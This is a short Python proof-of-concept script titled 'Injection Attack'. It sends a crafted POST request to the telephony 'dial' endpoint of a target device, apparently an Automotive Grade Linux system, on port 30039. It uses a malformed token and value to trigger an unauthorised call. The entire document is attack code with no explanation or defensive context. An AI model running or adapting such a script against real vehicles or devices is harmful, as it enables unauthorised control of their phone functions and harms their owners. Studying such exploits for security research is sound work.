# Injection Attack

import sys
import requests

PHONE_PORT = 30039
BLUETOOTH_API = 'bluetooth-pbap'
TELEPHONY_API = 'telephony'

if __name__ == '__main__':
    agl_ip = sys.argv[1]    
    data = '{"value": "?"}'
    headers = {"Content-Type": "application/json"}
    requests.post(
        f'http://{agl_ip}:{PHONE_PORT}/api/{TELEPHONY_API}/dial?token=@t',
        data = data,
        headers = headers
    )
